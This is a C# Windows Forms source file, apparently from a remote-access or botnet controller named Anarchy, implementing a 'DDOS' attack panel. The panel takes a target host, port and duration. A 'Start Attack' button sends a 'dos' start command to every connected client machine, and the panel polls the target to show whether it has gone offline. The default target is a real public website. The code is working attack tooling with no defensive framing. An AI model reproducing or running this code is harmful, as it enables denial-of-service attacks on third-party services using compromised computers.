using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using Anarchy.Helpers.MessagePack;
using Anarchy.Networking;
using ReaLTaiizor.Controls;
using ReaLTaiizor.Forms;

namespace Anarchy.Forms;

public class FormDOS : Form
{
    private TimeSpan timespan;

    private Stopwatch stopwatch;

    private string status = "is online";

    public object sync = new object();

    public List<Clients> selectedClients = new List<Clients>();

    public List<Clients> PlguinClients = new List<Clients>();

    private IContainer components;

    private Label label2;

    private Label label1;

    private TextBox txtPort;

    private TextBox txtHost;

    private Label label4;

    private Label label3;

    private TextBox txtTimeout;

    private System.Windows.Forms.Timer timer1;

    private System.Windows.Forms.Timer timer2;

    private HopeForm hopeForm1;

    private NightButton btnAttack;

    private NightButton btnStop;

    private FoxLabel foxLabel1;

    private FoxLabel foxLabel2;

    private FoxLabel foxLabel3;

    private FoxLabel foxLabel4;

    private PictureBox pictureBox1;

    public FormDOS()
    {
        this.InitializeComponent();
    }

    private void BtnAttack_Click(object sender, EventArgs e)
    {
        this.pictureBox1.Visible = !this.pictureBox1.Visible;
        if (string.IsNullOrWhiteSpace(this.txtHost.Text) || string.IsNullOrWhiteSpace(this.txtPort.Text) || string.IsNullOrWhiteSpace(this.txtTimeout.Text))
        {
            return;
        }
        try
        {
            if (!this.txtHost.Text.ToLower().StartsWith("http://"))
            {
                this.txtHost.Text = "http://" + this.txtHost.Text;
            }
            new Uri(this.txtHost.Text);
        }
        catch
        {
            return;
        }
        if (this.PlguinClients.Count <= 0)
        {
            return;
        }
        try
        {
            this.btnAttack.Enabled = false;
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "dos";
            msgPack.ForcePathObject("Option").AsString = "postStart";
            msgPack.ForcePathObject("Host").AsString = this.txtHost.Text;
            msgPack.ForcePathObject("Port").AsString = this.txtPort.Text;
            msgPack.ForcePathObject("Timeout").AsString = this.txtTimeout.Text;
            foreach (Clients plguinClient in this.PlguinClients)
            {
                this.selectedClients.Add(plguinClient);
                ThreadPool.QueueUserWorkItem(plguinClient.Send, msgPack.Encode2Bytes());
            }
            this.btnStop.Enabled = true;
            this.timespan = TimeSpan.FromSeconds(Convert.ToInt32(this.txtTimeout.Text) * 60);
            this.stopwatch = new Stopwatch();
            this.stopwatch.Start();
            this.timer1.Start();
            this.timer2.Start();
        }
        catch
        {
        }
    }

    private void BtnStop_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "dos";
            msgPack.ForcePathObject("Option").AsString = "postStop";
            foreach (Clients plguinClient in this.PlguinClients)
            {
                ThreadPool.QueueUserWorkItem(plguinClient.Send, msgPack.Encode2Bytes());
            }
            this.selectedClients.Clear();
            this.btnAttack.Enabled = true;
            this.btnStop.Enabled = false;
            this.timer1.Stop();
            this.timer2.Stop();
            this.status = "is online";
        }
        catch
        {
        }
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
        this.Text = $"DOS ATTACK:{this.timespan.Subtract(TimeSpan.FromSeconds(this.stopwatch.Elapsed.Seconds))}    Status:host {this.status}";
        if (this.timespan < this.stopwatch.Elapsed)
        {
            this.btnAttack.Enabled = true;
            this.btnStop.Enabled = false;
            this.timer1.Stop();
            this.timer2.Stop();
            this.status = "is online";
        }
    }

    private void Timer2_Tick(object sender, EventArgs e)
    {
        try
        {
            WebRequest.Create(new Uri(this.txtHost.Text)).GetResponse().Dispose();
            this.status = "is online";
        }
        catch
        {
            this.status = "is offline";
        }
    }

    private void FormDOS_FormClosing(object sender, FormClosingEventArgs e)
    {
        try
        {
            foreach (Clients plguinClient in this.PlguinClients)
            {
                plguinClient.Disconnected();
            }
            this.PlguinClients.Clear();
            this.selectedClients.Clear();
        }
        catch
        {
        }
        base.Hide();
        base.Parent = null;
        e.Cancel = true;
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && this.components != null)
        {
            this.components.Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
        this.components = new System.ComponentModel.Container();
        
        System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FormDOS));
        this.label2 = new System.Windows.Forms.Label();
        this.label1 = new System.Windows.Forms.Label();
        this.txtPort = new System.Windows.Forms.TextBox();
        this.txtHost = new System.Windows.Forms.TextBox();
        this.label4 = new System.Windows.Forms.Label();
        this.label3 = new System.Windows.Forms.Label();
        this.txtTimeout = new System.Windows.Forms.TextBox();
        this.timer1 = new System.Windows.Forms.Timer(this.components);
        this.timer2 = new System.Windows.Forms.Timer(this.components);
        this.hopeForm1 = new ReaLTaiizor.Forms.HopeForm();
        this.pictureBox1 = new System.Windows.Forms.PictureBox();
        this.btnAttack = new ReaLTaiizor.Controls.NightButton();
        this.btnStop = new ReaLTaiizor.Controls.NightButton();
        this.foxLabel1 = new ReaLTaiizor.Controls.FoxLabel();
        this.foxLabel2 = new ReaLTaiizor.Controls.FoxLabel();
        this.foxLabel3 = new ReaLTaiizor.Controls.FoxLabel();
        this.foxLabel4 = new ReaLTaiizor.Controls.FoxLabel();
        this.hopeForm1.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
        base.SuspendLayout();
        this.label2.AutoSize = true;
        this.label2.Location = new System.Drawing.Point(11, 84);
        this.label2.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
        this.label2.Name = "label2";
        this.label2.Size = new System.Drawing.Size(37, 13);
        this.label2.TabIndex = 2;
        this.label2.Text = "PORT";
        this.label1.AutoSize = true;
        this.label1.Location = new System.Drawing.Point(9, 59);
        this.label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
        this.label1.Name = "label1";
        this.label1.Size = new System.Drawing.Size(37, 13);
        this.label1.TabIndex = 2;
        this.label1.Text = "HOST";
        this.txtPort.Location = new System.Drawing.Point(55, 80);
        this.txtPort.Margin = new System.Windows.Forms.Padding(2);
        this.txtPort.Name = "txtPort";
        this.txtPort.Size = new System.Drawing.Size(48, 20);
        this.txtPort.TabIndex = 1;
        this.txtPort.Text = "80";
        this.txtHost.Location = new System.Drawing.Point(53, 56);
        this.txtHost.Margin = new System.Windows.Forms.Padding(2);
        this.txtHost.Name = "txtHost";
        this.txtHost.Size = new System.Drawing.Size(287, 20);
        this.txtHost.TabIndex = 1;
        this.txtHost.Text = "https://www.google.com/";
        this.label4.AutoSize = true;
        this.label4.Location = new System.Drawing.Point(121, 115);
        this.label4.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
        this.label4.Name = "label4";
        this.label4.Size = new System.Drawing.Size(26, 13);
        this.label4.TabIndex = 5;
        this.label4.Text = "min.";
        this.label3.AutoSize = true;
        this.label3.Location = new System.Drawing.Point(11, 115);
        this.label3.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
        this.label3.Name = "label3";
        this.label3.Size = new System.Drawing.Size(45, 13);
        this.label3.TabIndex = 4;
        this.label3.Text = "Timeout";
        this.txtTimeout.Location = new System.Drawing.Point(74, 112);
        this.txtTimeout.Margin = new System.Windows.Forms.Padding(2);
        this.txtTimeout.Name = "txtTimeout";
        this.txtTimeout.Size = new System.Drawing.Size(43, 20);
        this.txtTimeout.TabIndex = 3;
        this.txtTimeout.Text = "5";
        this.timer1.Interval = 1000;
        this.timer1.Tick += new System.EventHandler(Timer1_Tick);
        this.timer2.Interval = 5000;
        this.timer2.Tick += new System.EventHandler(Timer2_Tick);
        this.hopeForm1.ControlBoxColorH = System.Drawing.Color.FromArgb(228, 231, 237);
        this.hopeForm1.ControlBoxColorHC = System.Drawing.Color.FromArgb(245, 108, 108);
        this.hopeForm1.ControlBoxColorN = System.Drawing.Color.Black;
        this.hopeForm1.Controls.Add(this.pictureBox1);
        this.hopeForm1.Cursor = System.Windows.Forms.Cursors.Default;
        this.hopeForm1.Dock = System.Windows.Forms.DockStyle.Top;
        this.hopeForm1.Font = new System.Drawing.Font("Segoe UI", 12f);
        this.hopeForm1.ForeColor = System.Drawing.Color.Black;
        this.hopeForm1.Image = null;
        this.hopeForm1.Location = new System.Drawing.Point(0, 0);
        this.hopeForm1.MaximizeBox = false;
        this.hopeForm1.Name = "hopeForm1";
        this.hopeForm1.Size = new System.Drawing.Size(537, 40);
        this.hopeForm1.TabIndex = 3;
        this.hopeForm1.Text = "DDOS";
        this.hopeForm1.ThemeColor = System.Drawing.Color.White;
        this.pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
        this.pictureBox1.Location = new System.Drawing.Point(74, 12);
        this.pictureBox1.Name = "pictureBox1";
        this.pictureBox1.Size = new System.Drawing.Size(19, 18);
        this.pictureBox1.TabIndex = 13;
        this.pictureBox1.TabStop = false;
        this.pictureBox1.Visible = false;
        this.btnAttack.BackColor = System.Drawing.Color.Transparent;
        this.btnAttack.Cursor = System.Windows.Forms.Cursors.Hand;
        this.btnAttack.DialogResult = System.Windows.Forms.DialogResult.None;
        this.btnAttack.Font = new System.Drawing.Font("Segoe UI", 10f);
        this.btnAttack.ForeColor = System.Drawing.Color.FromArgb(242, 93, 89);
        this.btnAttack.HoverBackColor = System.Drawing.Color.FromArgb(50, 242, 93, 89);
        this.btnAttack.HoverForeColor = System.Drawing.Color.White;
        this.btnAttack.InterpolationType = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
        this.btnAttack.Location = new System.Drawing.Point(358, 50);
        this.btnAttack.MinimumSize = new System.Drawing.Size(144, 47);
        this.btnAttack.Name = "btnAttack";
        this.btnAttack.NormalBackColor = System.Drawing.Color.FromArgb(242, 93, 89);
        this.btnAttack.PixelOffsetType = System.Drawing.Drawing2D.PixelOffsetMode.HighQuality;
        this.btnAttack.PressedBackColor = System.Drawing.Color.FromArgb(100, 242, 93, 89);
        this.btnAttack.PressedForeColor = System.Drawing.Color.White;
        this.btnAttack.Radius = 20;
        this.btnAttack.Size = new System.Drawing.Size(179, 47);
        this.btnAttack.SmoothingType = System.Drawing.Drawing2D.SmoothingMode.AntiAlias;
        this.btnAttack.TabIndex = 7;
        this.btnAttack.Text = "Start Attack";
        this.btnAttack.Click += new System.EventHandler(BtnAttack_Click);
        this.btnStop.BackColor = System.Drawing.Color.Transparent;
        this.btnStop.Cursor = System.Windows.Forms.Cursors.Hand;
        this.btnStop.DialogResult = System.Windows.Forms.DialogResult.None;
        this.btnStop.Font = new System.Drawing.Font("Segoe UI", 10f);
        this.btnStop.ForeColor = System.Drawing.Color.FromArgb(242, 93, 89);
        this.btnStop.HoverBackColor = System.Drawing.Color.FromArgb(50, 242, 93, 89);
        this.btnStop.HoverForeColor = System.Drawing.Color.White;
        this.btnStop.InterpolationType = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
        this.btnStop.Location = new System.Drawing.Point(358, 103);
        this.btnStop.MinimumSize = new System.Drawing.Size(144, 47);
        this.btnStop.Name = "btnStop";
        this.btnStop.NormalBackColor = System.Drawing.Color.FromArgb(242, 93, 89);
        this.btnStop.PixelOffsetType = System.Drawing.Drawing2D.PixelOffsetMode.HighQuality;
        this.btnStop.PressedBackColor = System.Drawing.Color.FromArgb(100, 242, 93, 89);
        this.btnStop.PressedForeColor = System.Drawing.Color.White;
        this.btnStop.Radius = 20;
        this.btnStop.Size = new System.Drawing.Size(179, 47);
        this.btnStop.SmoothingType = System.Drawing.Drawing2D.SmoothingMode.AntiAlias;
        this.btnStop.TabIndex = 8;
        this.btnStop.Text = "Stop";
        this.btnStop.Click += new System.EventHandler(BtnStop_Click);
        this.foxLabel1.Font = new System.Drawing.Font("Segoe UI", 10f, System.Drawing.FontStyle.Bold);
        this.foxLabel1.ForeColor = System.Drawing.Color.FromArgb(76, 88, 100);
        this.foxLabel1.Location = new System.Drawing.Point(12, 56);
        this.foxLabel1.Name = "foxLabel1";
        this.foxLabel1.Size = new System.Drawing.Size(36, 19);
        this.foxLabel1.TabIndex = 9;
        this.foxLabel1.Text = "HOST";
        this.foxLabel2.Font = new System.Drawing.Font("Segoe UI", 10f, System.Drawing.FontStyle.Bold);
        this.foxLabel2.ForeColor = System.Drawing.Color.FromArgb(76, 88, 100);
        this.foxLabel2.Location = new System.Drawing.Point(12, 81);
        this.foxLabel2.Name = "foxLabel2";
        this.foxLabel2.Size = new System.Drawing.Size(36, 19);
        this.foxLabel2.TabIndex = 10;
        this.foxLabel2.Text = "Port:";
        this.foxLabel3.Font = new System.Drawing.Font("Segoe UI", 10f, System.Drawing.FontStyle.Bold);
        this.foxLabel3.ForeColor = System.Drawing.Color.FromArgb(76, 88, 100);
        this.foxLabel3.Location = new System.Drawing.Point(11, 113);
        this.foxLabel3.Name = "foxLabel3";
        this.foxLabel3.Size = new System.Drawing.Size(58, 19);
        this.foxLabel3.TabIndex = 11;
        this.foxLabel3.Text = "Timeout";
        this.foxLabel4.Font = new System.Drawing.Font("Segoe UI", 10f, System.Drawing.FontStyle.Bold);
        this.foxLabel4.ForeColor = System.Drawing.Color.FromArgb(76, 88, 100);
        this.foxLabel4.Location = new System.Drawing.Point(124, 112);
        this.foxLabel4.Name = "foxLabel4";
        this.foxLabel4.Size = new System.Drawing.Size(34, 19);
        this.foxLabel4.TabIndex = 12;
        this.foxLabel4.Text = "min.";
        base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
        base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
        this.BackColor = System.Drawing.Color.White;
        base.ClientSize = new System.Drawing.Size(537, 153);
        base.Controls.Add(this.foxLabel4);
        base.Controls.Add(this.foxLabel3);
        base.Controls.Add(this.foxLabel2);
        base.Controls.Add(this.foxLabel1);
        base.Controls.Add(this.btnStop);
        base.Controls.Add(this.btnAttack);
        base.Controls.Add(this.label4);
        base.Controls.Add(this.label2);
        base.Controls.Add(this.label3);
        base.Controls.Add(this.txtTimeout);
        base.Controls.Add(this.hopeForm1);
        base.Controls.Add(this.label1);
        base.Controls.Add(this.txtPort);
        base.Controls.Add(this.txtHost);
        base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
        base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
        base.Margin = new System.Windows.Forms.Padding(2);
        base.MaximizeBox = false;
        this.MaximumSize = new System.Drawing.Size(1920, 1080);
        this.MinimumSize = new System.Drawing.Size(190, 40);
        base.Name = "FormDOS";
        base.ShowIcon = false;
        base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
        this.Text = "DDOS";
        base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(FormDOS_FormClosing);
        this.hopeForm1.ResumeLayout(false);
        ((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
        base.ResumeLayout(false);
        base.PerformLayout();
    }
}